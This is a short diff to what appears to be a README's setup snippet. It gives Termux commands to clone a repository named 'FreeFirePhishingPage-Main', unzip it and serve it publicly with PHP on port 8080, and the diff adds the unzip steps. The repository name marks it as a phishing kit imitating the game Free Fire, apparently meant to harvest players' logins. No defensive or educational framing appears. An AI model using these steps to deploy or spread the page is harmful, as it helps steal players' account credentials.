@@ -13,6 +13,8 @@
 ```bash
 pkg install php -y
 git clone https://github.com/Xcn1ck2/FreeFirePhishingPage-Main
+pkg install unzip -y
+unzip FreeFirePhishingPage-Main.zip
 cd FreeFirePhishingPage-Main
 php -S 0.0.0.0:8080
 
